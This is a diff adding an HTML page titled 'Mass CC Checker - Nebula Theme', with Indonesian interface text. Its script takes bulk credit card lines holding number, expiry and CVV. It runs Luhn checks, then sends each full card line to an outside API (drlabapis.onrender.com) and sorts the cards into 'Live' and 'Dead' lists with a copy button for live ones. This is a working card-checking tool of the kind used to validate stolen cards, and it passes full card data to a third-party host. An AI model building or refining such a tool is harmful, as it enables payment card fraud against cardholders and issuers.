@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Mass CC Checker - Nebula Theme</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+
+    :root {
+      --bg-deep-space: #1a1a2e; /* Ungu sangat gelap */
+      --bg-nebula-dust: #2a2a4a; /* Ungu sedikit lebih terang */
+      --text-star-light: #e0e0f0; /* Putih keabu-abuan */
+      --text-medium: #a0a0c0; /* Abu-abu keunguan */
+      --accent-gold: #ffc107; /* Emas/Kuning */
+      --accent-gold-hover: #f7b731; /* Emas sedikit lebih gelap */
+      --live-glow: #2ecc71; /* Hijau terang */
+      --dead-ember: #e74c3c; /* Merah */
+      --border-subtle: rgba(255, 193, 7, 0.2); /* Border emas transparan */
+      --shadow-color: rgba(0, 0, 0, 0.4);
+      --font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      font-family: var(--font-family);
+      background: linear-gradient(135deg, var(--bg-deep-space) 0%, #25253c 100%);
+      color: var(--text-star-light);
+      padding: 30px;
+      max-width: 1000px;
+      margin: 20px auto;
+      box-sizing: border-box;
+    }
+
+    h2 {
+      text-align: center;
+      color: var(--accent-gold);
+      margin-bottom: 30px;
+      font-weight: 600;
+      letter-spacing: 1.5px;
+      text-shadow: 0 0 5px rgba(255, 193, 7, 0.3);
+    }
+
+    textarea {
+      width: 100%;
+      height: 200px;
+      background-color: var(--bg-nebula-dust);
+      color: var(--text-star-light);
+      border: 1px solid var(--border-subtle);
+      border-radius: 8px;
+      font-size: 15px;
+      font-family: 'Courier New', Courier, monospace; /* Monospace for CC lists */
+      padding: 15px;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+      resize: vertical;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+      box-shadow: inset 0 2px 5px rgba(0,0,0,0.3);
+    }
+
+    textarea:focus {
+      outline: none;
+      border-color: var(--accent-gold);
+      box-shadow: inset 0 2px 5px rgba(0,0,0,0.3), 0 0 10px rgba(255, 193, 7, 0.4);
+    }
+
+    .controls {
+      display: flex;
+      gap: 15px;
+      margin-bottom: 25px;
+    }
+
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      font-family: var(--font-family);
+      border: none;
+      background: linear-gradient(145deg, var(--accent-gold), var(--accent-gold-hover));
+      color: var(--bg-deep-space);
+      font-weight: 600;
+      cursor: pointer;
+      border-radius: 6px;
+      transition: all 0.3s ease;
+      flex-grow: 1;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    button:hover:not(:disabled) {
+      background: linear-gradient(145deg, var(--accent-gold-hover), var(--accent-gold));
+      box-shadow: 0 6px 12px rgba(0,0,0,0.4);
+      transform: translateY(-2px);
+    }
+    button:active:not(:disabled) {
+        transform: translateY(0px);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+    }
+
+    button#pauseButton {
+        background: linear-gradient(145deg, #6c757d, #5a6268); /* Abu-abu untuk pause */
+        color: #f0f0f0;
+    }
+    button#pauseButton:hover:not(:disabled) {
+        background: linear-gradient(145deg, #5a6268, #6c757d);
+    }
+    button#pauseButton.resume { /* State ketika tombol bertuliskan Resume */
+        background: linear-gradient(145deg, #ffc107, #f7b731);
+        color: var(--bg-deep-space);
+    }
+
+
+    button:disabled {
+        background: #444;
+        color: #888;
+        cursor: not-allowed;
+        box-shadow: none;
+        transform: none;
+    }
+
+
+    .status-bar {
+        text-align: center;
+        margin-bottom: 25px;
+        font-style: italic;
+        color: var(--text-medium);
+        height: 20px; /* Reserve space */
+        transition: color 0.3s ease;
+    }
+    .status-bar.processing {
+        color: var(--accent-gold);
+        font-weight: 600;
+    }
+
+    .results-container {
+      display: grid; /* Use Grid for potentially more complex layouts */
+      grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+      gap: 25px;
+      margin-top: 20px;
+    }
+
+    .results-box {
+      background-color: var(--bg-nebula-dust);
+      padding: 20px 25px;
+      border-radius: 10px;
+      box-shadow: 0 8px 20px var(--shadow-color);
+      min-height: 400px; /* Min height instead of fixed */
+      display: flex;
+      flex-direction: column;
+      border: 1px solid var(--border-subtle);
+      overflow: hidden; /* Hide overflow before content loads */
+    }
+
+    .results-box h3 {
+      color: var(--accent-gold);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 20px;
+      margin: 0 0 15px 0;
+      padding-bottom: 12px;
+      border-bottom: 1px solid var(--border-subtle);
+      font-weight: 600;
+    }
+    .results-box h3 .icon { margin-right: 8px; }
+    .results-box h3 .count {
+        font-size: 14px;
+        background-color: var(--bg-deep-space);
+        padding: 4px 10px;
+        border-radius: 15px; /* Pill shape */
+        font-weight: 400;
+    }
+
+    .eye-toggle {
+      cursor: pointer;
+      font-size: 22px;
+      user-select: none;
+      color: var(--accent-gold);
+      transition: color 0.3s ease, transform 0.2s ease;
+    }
+    .eye-toggle:hover {
+        color: var(--accent-gold-hover);
+        transform: scale(1.1);
+    }
+
+    .cards-wrapper {
+        overflow-y: auto;
+        flex-grow: 1;
+        padding-right: 8px; /* Space for scrollbar */
+        margin-right: -8px; /* Counteract padding for scrollbar */
+    }
+
+    .card {
+      background-color: rgba(26, 26, 46, 0.7); /* Slightly transparent */
+      padding: 15px 18px;
+      border-radius: 6px;
+      margin-bottom: 12px;
+      border-left: 5px solid; /* Accent border */
+      color: var(--text-star-light);
+      font-size: 13px; /* Slightly smaller for more info */
+      line-height: 1.6;
+      animation: slideInUp 0.4s ease-out forwards;
+      opacity: 0;
+      position: relative;
+      box-shadow: 0 3px 6px rgba(0,0,0,0.2);
+      font-family: 'Courier New', Courier, monospace;
+    }
+
+    @keyframes slideInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .card span.label {
+      font-weight: 600; /* Bolder label */
+      color: var(--accent-gold);
+      display: inline-block;
+      min-width: 70px;
+      margin-right: 5px;
+    }
+     .card span.response-value {
+        font-weight: 600;
+     }
+
+    .card.live {
+      border-left-color: var(--live-glow);
+    }
+    .card.live span.response-value { color: var(--live-glow); }
+
+    .card.dead {
+      border-left-color: var(--dead-ember);
+    }
+     .card.dead span.response-value { color: var(--dead-ember); }
+
+    .card.error .response-value {
+        color: #ff8a8a; /* Lighter red for errors */
+    }
+
+    .copy-button {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background-color: rgba(255, 193, 7, 0.8); /* Gold accent */
+        color: var(--bg-deep-space);
+        border: none;
+        border-radius: 4px;
+        padding: 4px 8px;
+        font-size: 11px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        opacity: 0.7;
+    }
+    .copy-button:hover {
+        background-color: var(--accent-gold);
+        opacity: 1;
+        transform: scale(1.05);
+    }
+     .copy-button.copied {
+        background-color: var(--live-glow);
+        color: white;
+        opacity: 1;
+     }
+
+
+    /* Custom scrollbar - Nebula theme */
+    ::-webkit-scrollbar {
+      width: 10px;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: linear-gradient(var(--accent-gold), var(--accent-gold-hover));
+      border-radius: 10px;
+      border: 2px solid var(--bg-nebula-dust);
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: linear-gradient(var(--accent-gold-hover), var(--accent-gold));
+    }
+    ::-webkit-scrollbar-track {
+      background: var(--bg-nebula-dust);
+      border-radius: 10px;
+    }
+
+  </style>
+</head>
+<body>
+  <h2>Mass CC Checker - Nebula Theme</h2>
+
+  <textarea id="ccList" placeholder="Format: cc|mm|yyyy|cvv atau cc|mm|yy|cvv (satu per baris)"></textarea>
+
+  <div class="controls">
+      <button id="startButton" onclick="startChecking()">🚀 Start Check</button>
+      <button id="pauseButton" onclick="togglePause()" disabled>⏸️ Pause</button>
+  </div>
+
+  <div class="status-bar" id="statusBar">Masukkan daftar CC dan klik "Mulai Cek".</div>
+
+  <div class="results-container">
+    <div class="results-box">
+      <h3><span class="icon">✨</span> Live <span id="liveCount" class="count">0</span></h3>
+      <div class="cards-wrapper" id="liveResults"></div>
+    </div>
+    <div class="results-box">
+      <h3>
+        <span><span class="icon">💀</span> Dead / Invalid <span id="deadCount" class="count">0</span></span>
+        <span class="eye-toggle" onclick="toggleDead()" id="deadToggle">👁️‍🗨️</span>
+      </h3>
+      <div class="cards-wrapper" id="deadResults" style="display: none;"></div>
+    </div>
+  </div>
+
+  <script>
+    const ccListTextArea = document.getElementById('ccList');
+    const startButton = document.getElementById('startButton');
+    const pauseButton = document.getElementById('pauseButton');
+    const statusBar = document.getElementById('statusBar');
+    const liveResultsDiv = document.getElementById('liveResults');
+    const deadResultsDiv = document.getElementById('deadResults');
+    const liveCountSpan = document.getElementById('liveCount');
+    const deadCountSpan = document.getElementById('deadCount');
+    const deadToggle = document.getElementById('deadToggle');
+    const deadResultsWrapper = document.getElementById('deadResults');
+
+    // State variables
+    let isChecking = false;
+    let isPaused = false;
+    let liveCount = 0;
+    let deadCount = 0;
+    let totalInitialCount = 0; // To keep track of the starting number
+    const CHECK_DELAY_MS = 200; // Slightly increased delay for smoother textarea update
+
+    function toggleDead() {
+      const isHidden = deadResultsWrapper.style.display === "none";
+      deadResultsWrapper.style.display = isHidden ? "block" : "none";
+      deadToggle.textContent = isHidden ? "👁️" : "👁️‍🗨️";
+    }
+
+    function luhnCheck(ccNum) {
+      let sum = 0;
+      let shouldDouble = false;
+      for (let i = ccNum.length - 1; i >= 0; i--) {
+        let digit = parseInt(ccNum[i], 10);
+        if (isNaN(digit)) return false;
+        if (shouldDouble) {
+          digit *= 2;
+          if (digit > 9) digit -= 9;
+        }
+        sum += digit;
+        shouldDouble = !shouldDouble;
+      }
+      return sum % 10 === 0;
+    }
+
+    function updateCounts() {
+        liveCountSpan.textContent = liveCount;
+        deadCountSpan.textContent = deadCount;
+    }
+
+    function addResult(isLive, cardData, status, isError = false) {
+        const cardDiv = document.createElement('div');
+        cardDiv.classList.add('card');
+        let cardContent = `<span class="label">CC:</span> ${cardData}<br><span class="label">Respons:</span> <span class="response-value">${status}</span>`;
+
+        if (isLive) {
+            liveCount++;
+            cardDiv.classList.add('live');
+            const uniqueId = `copy-${Date.now()}-${Math.random()}`;
+            cardContent += `<button id="${uniqueId}" class="copy-button" onclick="copyToClipboard('${cardData}', '${uniqueId}')">COPY</button>`;
+            cardDiv.innerHTML = cardContent;
+            liveResultsDiv.appendChild(cardDiv);
+            // Scroll smoothly to the bottom
+            liveResultsDiv.scrollTo({ top: liveResultsDiv.scrollHeight, behavior: 'smooth' });
+        } else {
+            deadCount++;
+            cardDiv.classList.add('dead');
+             if (isError) cardDiv.classList.add('error');
+            cardDiv.innerHTML = cardContent;
+            deadResultsDiv.appendChild(cardDiv);
+             // Scroll smoothly to the bottom
+            deadResultsDiv.scrollTo({ top: deadResultsDiv.scrollHeight, behavior: 'smooth' });
+        }
+        updateCounts();
+    }
+
+     function copyToClipboard(text, buttonId) {
+        navigator.clipboard.writeText(text).then(() => {
+            const button = document.getElementById(buttonId);
+            if (button) {
+                const originalText = button.textContent;
+                button.textContent = 'COPIED!';
+                button.classList.add('copied');
+                button.disabled = true;
+                setTimeout(() => {
+                    button.textContent = originalText;
+                    button.classList.remove('copied');
+                    button.disabled = false;
+                }, 1500);
+            }
+        }).catch(err => {
+            console.error('failed to copy: ', err);
+        });
+    }
+
+    // --- Main Processing Logic ---
+    async function processCard(line, remainingLines) {
+        if (!line) {
+            return { processed: true, status: "Skipped empty line" }; // Indicate processed
+        }
+
+        const parts = line.split(/[|/ -]/);
+        const cc = parts[0] ? parts[0].replace(/\s/g, '') : '';
+
+        if (!/^\d{13,16}$/.test(cc)) {
+             addResult(false, line, "Invalid Format");
+             return { processed: true, status: "Invalid Format" };
+        }
+
+        if (!luhnCheck(cc)) {
+            addResult(false, line, "Gagal Cek Luhn");
+            return { processed: true, status: "Luhn Fail" };
+        }
+
+        // If format and Luhn are okay, try the API
+        try {
+            const res = await fetch(`https://drlabapis.onrender.com/api/chk/?cc=${encodeURIComponent(line)}`);
+            if (!res.ok) {
+                 throw new Error(`API request failed (${res.status})`);
+            }
+            const jsonResponse = await res.json();
+            const status = jsonResponse?.response ?? "Unknown API response";
+            const isLive = status.toLowerCase().includes("live");
+            addResult(isLive, line, status);
+             return { processed: true, status: status };
+
+        } catch (err) {
+            console.error("API Error for:", line, err);
+            addResult(false, line, `Error: ${err.message}`, true);
+             return { processed: true, status: `Error: ${err.message}` };
+        }
+    }
+
+    function scheduleNextCheck() {
+        if (!isChecking) return; // Stop if checking was cancelled
+
+        if (isPaused) {
+            // Update status but don't schedule next check yet
+            const lines = ccListTextArea.value.trim().split('\n').filter(l => l.trim() !== '');
+            statusBar.textContent = `⏸️ Paused. ${lines.length} card left.`;
+            statusBar.classList.add('processing');
+            return;
+        }
+
+        let currentText = ccListTextArea.value;
+        let lines = currentText.trim().split('\n');
+        let nonBlankLines = lines.filter(l => l.trim() !== '');
+
+        if (nonBlankLines.length === 0) {
+            finishChecking();
+            return;
+        }
+
+        // Get the first non-blank line
+        const lineToProcess = nonBlankLines[0];
+        statusBar.textContent = `⏳ Checking... ${nonBlankLines.length} card left.`;
+        statusBar.classList.add('processing');
+
+        processCard(lineToProcess).then(result => {
+            if (result.processed) {
+                // Find the *actual* first occurrence of the processed line in the *original* lines array
+                // This handles cases where identical lines exist
+                const indexToRemove = lines.findIndex(l => l.trim() === lineToProcess.trim());
+
+                if (indexToRemove !== -1) {
+                    lines.splice(indexToRemove, 1); // Remove the processed line
+                    ccListTextArea.value = lines.join('\n'); // Update textarea
+                } else {
+                    // Fallback: If somehow not found (shouldn't happen often), remove the first non-blank
+                     const firstNonBlankIndex = lines.findIndex(l => l.trim() !== '');
+                     if(firstNonBlankIndex !== -1) {
+                        lines.splice(firstNonBlankIndex, 1);
+                        ccListTextArea.value = lines.join('\n');
+                     }
+                }
+
+                 // Check remaining lines *after* potential removal
+                const remainingLines = ccListTextArea.value.trim().split('\n').filter(l => l.trim() !== '');
+                if (remainingLines.length === 0) {
+                    finishChecking(); // Finish if textarea is now empty
+                } else {
+                     setTimeout(scheduleNextCheck, CHECK_DELAY_MS); // Schedule next
+                }
+            } else {
+                 // If not processed (e.g., error before adding result), still schedule next? Or stop?
+                 // Let's schedule next to avoid getting stuck.
+                 setTimeout(scheduleNextCheck, CHECK_DELAY_MS);
+            }
+        }).catch(err => {
+            // Handle potential errors in processCard promise itself (unlikely here)
+            console.error("Error during card processing chain:", err);
+            statusBar.textContent = "⚠️ Error, please check console.";
+            statusBar.classList.remove('processing');
+             // Decide whether to continue or stop on such errors
+             setTimeout(scheduleNextCheck, CHECK_DELAY_MS); // Try next card
+        });
+    }
+
+
+    function startChecking() {
+        if (isChecking) return;
+
+        const initialText = ccListTextArea.value.trim();
+        const initialLines = initialText.split('\n').filter(l => l.trim() !== '');
+        totalInitialCount = initialLines.length;
+
+        if (totalInitialCount === 0) {
+            statusBar.textContent = "Textarea kosong atau hanya berisi baris kosong.";
+            statusBar.classList.remove('processing');
+            return;
+        }
+
+        // Reset state
+        liveCount = 0;
+        deadCount = 0;
+        isChecking = true;
+        isPaused = false;
+
+        // Clear previous results visually
+        liveResultsDiv.innerHTML = '';
+        deadResultsDiv.innerHTML = '';
+        updateCounts();
+
+        // Update UI
+        ccListTextArea.disabled = true; // Disable editing during check
+        startButton.disabled = true;
+        pauseButton.disabled = false;
+        pauseButton.textContent = '⏸️ Pause';
+        pauseButton.classList.remove('resume');
+        statusBar.textContent = `🚀 Checking ${totalInitialCount} card...`;
+        statusBar.classList.add('processing');
+
+        // Start the processing loop
+        scheduleNextCheck();
+    }
+
+    function togglePause() {
+        if (!isChecking) return;
+
+        isPaused = !isPaused;
+        pauseButton.textContent = isPaused ? '▶️ Resume' : '⏸️ Pause';
+        pauseButton.classList.toggle('resume', isPaused); // Add/remove 'resume' class for styling
+
+        if (!isPaused) {
+            // If resuming, restart the check schedule
+            statusBar.textContent = `▶️ resuming check...`;
+            statusBar.classList.add('processing');
+            scheduleNextCheck(); // Trigger the next check cycle
+        } else {
+             // Update status when paused
+             const lines = ccListTextArea.value.trim().split('\n').filter(l => l.trim() !== '');
+             statusBar.textContent = `⏸️ Paused. ${lines.length} card left.`;
+             statusBar.classList.add('processing');
+        }
+    }
+
+     function finishChecking() {
+        isChecking = false;
+        isPaused = false;
+        const remainingLinesCount = ccListTextArea.value.trim().split('\n').filter(l => l.trim() !== '').length;
+        statusBar.textContent = `✅ Done. ${liveCount} Live, ${deadCount} Dead.`;
+        statusBar.classList.remove('processing');
+
+        // Update UI
+        ccListTextArea.disabled = false; // Re-enable textarea
+        startButton.disabled = false;
+        pauseButton.disabled = true;
+        pauseButton.textContent = '⏸️ Pause';
+        pauseButton.classList.remove('resume');
+    }
+
+  </script>
+</body>
+</html>
